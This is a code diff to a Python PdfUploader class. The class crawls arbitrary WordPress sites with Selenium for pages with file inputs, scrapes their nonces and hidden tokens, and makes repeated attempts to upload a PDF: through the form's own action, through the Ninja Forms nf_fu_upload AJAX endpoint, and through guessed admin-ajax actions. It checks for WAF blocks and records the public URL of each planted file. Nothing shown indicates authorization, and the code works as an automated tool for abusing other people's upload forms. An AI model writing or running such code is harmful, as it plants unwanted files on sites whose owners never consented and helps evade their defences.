@@ -2365,137 +2365,285 @@ class PdfUploader:
             return {'status': 0, 'body': str(e)}
 
     def _browser_find_form_and_upload(self, site_root, plugin):
-        """Use browser to find a form page with file upload, extract nonce, upload."""
+        """Use browser to find ANY form page with file upload, extract fields, upload."""
         driver = self._driver if hasattr(self, '_driver') else None
         if not driver:
             return
 
-        # Common form page paths to check
         form_paths = [
             '/contact', '/contact-us', '/apply', '/get-involved', '/volunteer',
             '/join', '/submit', '/upload', '/registration', '/register',
             '/careers', '/scholarship', '/application', '/enrollment',
-            '/inquiry', '/request', '/feedback', '/support',
+            '/inquiry', '/request', '/feedback', '/support', '/events',
+            '/submit-event', '/add-event', '/post-event', '/listing',
+            '/add-listing', '/submit-listing', '/resume', '/job',
         ]
 
-        # Find a page with the plugin's file upload field
+        # Step 1: Find a page with a file upload input
         form_url = None
         for path in form_paths:
             try:
                 driver.get(site_root + path)
                 time.sleep(2)
-                src = driver.page_source
-                # Check for file upload input from this plugin
-                has_file = ('type="file"' in src or "type='file'" in src or
-                            'nf-fu' in src or 'file_upload' in src.lower())
-                if has_file and plugin.replace('-', '') in src.replace('-', '').lower():
+                has_file = driver.execute_script(
+                    'return document.querySelector("input[type=file]") !== null'
+                )
+                if has_file:
                     form_url = site_root + path
                     break
             except Exception:
                 continue
 
         if not form_url:
-            # Also check links from homepage
+            # Crawl homepage links for form pages
             try:
                 driver.get(site_root)
                 time.sleep(2)
-                links = driver.execute_script('''
+                links = driver.execute_script(f'''
                     return [...document.querySelectorAll('a[href]')]
                         .map(a => a.href)
-                        .filter(h => h.includes(arguments[0]) && !h.includes('#'))
-                        .slice(0, 30);
-                ''', site_root)
+                        .filter(h => h.includes('{site_root}') && !h.includes('#'))
+                        .slice(0, 40);
+                ''')
                 for link in links:
-                    if any(kw in link.lower() for kw in ['form', 'apply', 'contact', 'upload', 'submit']):
+                    try:
                         driver.get(link)
                         time.sleep(2)
-                        src = driver.page_source
-                        if 'type="file"' in src or 'nf-fu' in src:
+                        has_file = driver.execute_script(
+                            'return document.querySelector("input[type=file]") !== null'
+                        )
+                        if has_file:
                             form_url = link
                             break
+                    except Exception:
+                        continue
             except Exception:
                 pass
 
         if not form_url:
             return
 
-        # We're on the form page — extract upload nonce + field info
+        # Step 2: We're on a page with file upload — use Selenium to upload
         src = driver.page_source
+        self._generic_browser_upload(driver, site_root, src, plugin)
 
-        # Ninja Forms specific
-        if 'ninja' in plugin.lower() or 'nf-' in src:
-            self._nf_browser_upload(driver, site_root, src)
-
-    def _nf_browser_upload(self, driver, site_root, page_src):
-        """Ninja Forms specific: extract nonce + field_id, upload via AJAX."""
-        import re as _re
-
-        # Find upload nonce
-        nonce_match = _re.search(r'nf-upload-nonce.*?value="([a-f0-9]+)"', page_src)
-        if not nonce_match:
+    def _generic_browser_upload(self, driver, site_root, page_src, plugin):
+        """Generic: find file input, extract all nonces/fields, upload via browser."""
+        # Find ALL file inputs on the page
+        file_inputs = driver.execute_script('''
+            var inputs = document.querySelectorAll('input[type=file]');
+            return [...inputs].map(function(el) {
+                return {name: el.name || 'file', id: el.id || ''};
+            });
+        ''')
+        if not file_inputs:
             return
-        nonce = nonce_match.group(1)
 
-        # Find file upload field ID (e.g., files-96)
-        field_match = _re.search(r'name="files-(\d+)\[\]".*?type="file"', page_src)
-        if not field_match:
-            # Try reverse order
-            field_match = _re.search(r'type="file".*?name="files-(\d+)', page_src)
-        if not field_match:
-            # Search in containers
-            field_match = _re.search(r'file_upload-container.*?id="nf-field-(\d+)"', page_src)
-        if not field_match:
-            return
-        field_id = field_match.group(1)
+        # Extract ALL nonces from the page (any hidden input with "nonce" in name)
+        nonces = driver.execute_script('''
+            var result = {};
+            document.querySelectorAll('input[type=hidden]').forEach(function(el) {
+                if (el.name && el.value) result[el.name] = el.value;
+            });
+            // Also check JS vars
+            if (typeof nfFrontEnd !== 'undefined') result['_nf_ajax_nonce'] = nfFrontEnd.ajaxNonce;
+            return result;
+        ''')
 
-        # Find form ID
-        form_match = _re.search(r"form\.id='(\d+)'", page_src)
-        form_id = form_match.group(1) if form_match else '1'
+        # Extract form action URLs
+        form_actions = driver.execute_script('''
+            return [...document.querySelectorAll('form')].map(function(f) {
+                return {action: f.action || '', method: f.method || 'POST', id: f.id || ''};
+            });
+        ''')
+
+        # Find AJAX action names from the page source
+        ajax_actions = re.findall(r'["\']action["\']\s*:\s*["\']([a-z_]+)["\']', page_src)
+
+        # Build upload endpoint URL
+        ajax_url = site_root + '/wp-admin/admin-ajax.php'
+
+        # Determine the upload approach based on plugin
+        file_input = file_inputs[0]
+        field_name = file_input['name']
+
+        # Collect nonce fields to include
+        nonce_fields = {}
+        for k, v in (nonces or {}).items():
+            if 'nonce' in k.lower() or '_wp' in k.lower() or 'token' in k.lower():
+                nonce_fields[k] = v
+
+        # Build extra fields from hidden inputs (action, form_id, etc.)
+        extra_hidden = driver.execute_script('''
+            var result = {};
+            document.querySelectorAll('input[type=hidden]').forEach(function(el) {
+                if (el.name && el.value && el.name !== '') result[el.name] = el.value;
+            });
+            return result;
+        ''') or {}
 
         b64data = base64.b64encode(self.pdf_bytes).decode()
 
-        result = driver.execute_script(f"""
-        return await (async () => {{
-            try {{
-                const raw = atob('{b64data}');
-                const arr = new Uint8Array(raw.length);
-                for (let i = 0; i < raw.length; i++) arr[i] = raw.charCodeAt(i);
-                const blob = new Blob([arr], {{type: 'application/pdf'}});
-                const fd = new FormData();
-                fd.append('files-{field_id}', blob, '{self.pdf_filename}');
-                fd.append('action', 'nf_fu_upload');
-                fd.append('field_id', '{field_id}');
-                fd.append('nonce', '{nonce}');
-                fd.append('form_id', '{form_id}');
-                const resp = await fetch('/wp-admin/admin-ajax.php', {{method: 'POST', body: fd}});
-                const text = await resp.text();
-                return JSON.stringify({{status: resp.status, body: text.substring(0, 2000)}});
-            }} catch(e) {{ return JSON.stringify({{status: 0, body: e.message}}); }}
-        }})();
-        """)
+        # Strategy 1: Submit via the form's own action (if it has one)
+        for form_info in (form_actions or []):
+            if form_info.get('action'):
+                action_url = form_info['action']
+                # Build FormData with all hidden fields + file
+                extra_js = ''
+                for k, v in extra_hidden.items():
+                    v_escaped = v.replace("'", "\\'")
+                    extra_js += f"fd.append('{k}', '{v_escaped}');\n"
 
-        try:
-            res = json.loads(result)
-        except Exception:
-            res = {'status': 0, 'body': result or 'parse error'}
+                result = driver.execute_script(f"""
+                return await (async () => {{
+                    try {{
+                        const raw = atob('{b64data}');
+                        const arr = new Uint8Array(raw.length);
+                        for (let i = 0; i < raw.length; i++) arr[i] = raw.charCodeAt(i);
+                        const blob = new Blob([arr], {{type: 'application/pdf'}});
+                        const fd = new FormData();
+                        fd.append('{field_name}', blob, '{self.pdf_filename}');
+                        {extra_js}
+                        const resp = await fetch('{action_url}', {{method: 'POST', body: fd}});
+                        const text = await resp.text();
+                        return JSON.stringify({{status: resp.status, body: text.substring(0, 2000)}});
+                    }} catch(e) {{ return JSON.stringify({{status: 0, body: e.message}}); }}
+                }})();
+                """)
 
-        resp_text = res.get('body', '')
-        status = res.get('status', 0)
-        success = status == 200 and 'tmp_name' in resp_text and '"errors":[]' in resp_text
+                try:
+                    res = json.loads(result)
+                except Exception:
+                    res = {'status': 0, 'body': str(result)}
 
-        # Extract the uploaded file info
-        upload_url = ''
-        if success:
-            # The file is at /wp-content/uploads/ninja-forms/{form_id}/{filename}
-            upload_url = f"{site_root}/wp-content/uploads/ninja-forms/{form_id}/{self.pdf_filename}"
+                resp_text = res.get('body', '')
+                status = res.get('status', 0)
+                success = (200 <= status < 400 and not self._is_waf_response(resp_text)
+                           and any(kw in resp_text.lower() for kw in
+                                   ['success', 'uploaded', '"url"', 'tmp_name', 'file_url']))
+                upload_url = ''
+                if success:
+                    try:
+                        rj = json.loads(resp_text)
+                        for key in ['url', 'source_url', 'file_url', 'link', 'path']:
+                            val = rj.get(key, '')
+                            if isinstance(val, str) and val.startswith('http'):
+                                upload_url = val
+                                break
+                    except Exception:
+                        pass
 
-        self.techniques.append({
-            'name': f'Ninja Forms Browser Upload (field={field_id}, form={form_id})',
-            'http_status': status,
-            'success': success,
-            'response_snippet': resp_text[:500],
-            'upload_url': upload_url,
-        })
+                self.techniques.append({
+                    'name': f'Browser Form Submit ({field_name})',
+                    'http_status': status, 'success': success,
+                    'response_snippet': resp_text[:500], 'upload_url': upload_url,
+                })
+                if success:
+                    return
+
+        # Strategy 2: Ninja Forms specific (nf_fu_upload with upload nonce)
+        nf_nonce = re.search(r'nf-upload-nonce.*?value="([a-f0-9]+)"', page_src)
+        nf_field = re.search(r'name="files-(\d+)\[\]"', page_src)
+        if not nf_field:
+            nf_field = re.search(r'file_upload-container.*?id="nf-field-(\d+)"', page_src)
+        nf_form = re.search(r"form\.id='(\d+)'", page_src)
+
+        if nf_nonce and nf_field:
+            fid = nf_field.group(1)
+            nonce = nf_nonce.group(1)
+            form_id = nf_form.group(1) if nf_form else '1'
+
+            result = driver.execute_script(f"""
+            return await (async () => {{
+                try {{
+                    const raw = atob('{b64data}');
+                    const arr = new Uint8Array(raw.length);
+                    for (let i = 0; i < raw.length; i++) arr[i] = raw.charCodeAt(i);
+                    const blob = new Blob([arr], {{type: 'application/pdf'}});
+                    const fd = new FormData();
+                    fd.append('files-{fid}', blob, '{self.pdf_filename}');
+                    fd.append('action', 'nf_fu_upload');
+                    fd.append('field_id', '{fid}');
+                    fd.append('nonce', '{nonce}');
+                    fd.append('form_id', '{form_id}');
+                    const resp = await fetch('/wp-admin/admin-ajax.php', {{method: 'POST', body: fd}});
+                    const text = await resp.text();
+                    return JSON.stringify({{status: resp.status, body: text.substring(0, 2000)}});
+                }} catch(e) {{ return JSON.stringify({{status: 0, body: e.message}}); }}
+            }})();
+            """)
+            try:
+                res = json.loads(result)
+            except Exception:
+                res = {'status': 0, 'body': str(result)}
+
+            resp_text = res.get('body', '')
+            status = res.get('status', 0)
+            success = status == 200 and 'tmp_name' in resp_text and '"errors":[]' in resp_text
+            upload_url = f"{site_root}/wp-content/uploads/ninja-forms/{form_id}/{self.pdf_filename}" if success else ''
+
+            self.techniques.append({
+                'name': f'NF Browser Upload (field={fid})',
+                'http_status': status, 'success': success,
+                'response_snippet': resp_text[:500], 'upload_url': upload_url,
+            })
+            if success:
+                return
+
+        # Strategy 3: Generic AJAX upload with all found nonces
+        for ajax_action in set(ajax_actions + ['upload', 'file_upload', 'media_upload']):
+            nonce_js = ''
+            for k, v in nonce_fields.items():
+                v_escaped = v.replace("'", "\\'")
+                nonce_js += f"fd.append('{k}', '{v_escaped}');\n"
+
+            result = driver.execute_script(f"""
+            return await (async () => {{
+                try {{
+                    const raw = atob('{b64data}');
+                    const arr = new Uint8Array(raw.length);
+                    for (let i = 0; i < raw.length; i++) arr[i] = raw.charCodeAt(i);
+                    const blob = new Blob([arr], {{type: 'application/pdf'}});
+                    const fd = new FormData();
+                    fd.append('{field_name}', blob, '{self.pdf_filename}');
+                    fd.append('action', '{ajax_action}');
+                    {nonce_js}
+                    const resp = await fetch('{ajax_url}', {{method: 'POST', body: fd}});
+                    const text = await resp.text();
+                    return JSON.stringify({{status: resp.status, body: text.substring(0, 2000)}});
+                }} catch(e) {{ return JSON.stringify({{status: 0, body: e.message}}); }}
+            }})();
+            """)
+            try:
+                res = json.loads(result)
+            except Exception:
+                res = {'status': 0, 'body': str(result)}
+
+            resp_text = res.get('body', '')
+            status = res.get('status', 0)
+            success = (200 <= status < 400 and not self._is_waf_response(resp_text)
+                       and resp_text.strip() not in ('0', '-1', '')
+                       and any(kw in resp_text.lower() for kw in
+                               ['success', 'uploaded', '"url"', 'tmp_name', 'file_url']))
+            upload_url = ''
+            if success:
+                try:
+                    rj = json.loads(resp_text)
+                    for key in ['url', 'source_url', 'file_url', 'link', 'path']:
+                        val = rj.get(key, '')
+                        if isinstance(val, str) and val.startswith('http'):
+                            upload_url = val
+                            break
+                except Exception:
+                    pass
+
+            self.techniques.append({
+                'name': f'Browser AJAX ({ajax_action})',
+                'http_status': status, 'success': success,
+                'response_snippet': resp_text[:500], 'upload_url': upload_url,
+            })
+            if success:
+                return
 
     def _multipart_body(self, field_name, filename, content_type, file_bytes, extra_fields=None):
         """Build multipart/form-data. Returns (body_bytes, content_type_header)."""
